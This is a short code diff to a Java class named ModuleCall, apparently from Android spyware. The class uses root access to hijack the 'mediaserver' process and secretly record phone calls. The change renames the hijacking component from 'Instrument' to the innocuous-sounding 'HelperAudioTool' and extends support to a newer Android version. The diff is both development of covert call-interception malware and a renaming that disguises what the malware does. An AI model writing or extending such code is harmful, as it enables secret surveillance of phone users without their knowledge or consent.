@@ -38,8 +38,8 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
 import com.android.dvci.util.DateTime;
 import com.android.dvci.util.Execute;
+import com.android.dvci.util.HelperAudioTool;
 import com.android.dvci.util.ICallBack;
-import com.android.dvci.util.Instrument;
 import com.android.dvci.util.PackageUtils;
 import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
@@ -84,7 +84,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static BlockingQueue<String> calls;
 	private EncodingTask encodingTask;
 	private CallBack hjcb;
-	private Instrument hijack;
+	private HelperAudioTool hijack;
 
 	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
 	public static final byte[] MP4_HEADER = new byte[]{0, 0, 0};
@@ -138,7 +138,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		if (Status.haveRoot()) {
 
-			if (android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 18) {
+			if (android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 19) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (actualStart): OS level not supported");
 				}
@@ -305,7 +305,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		hjcb = new CallBack();
 		hjcb.register(new HC());
 
-		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
+		hijack = new HelperAudioTool(M.e("mediaserver"), AudioEncoder.getAudioStorage());
 
 		if (hijack.startInstrumentation()) {
 			if (Cfg.DEBUG) {
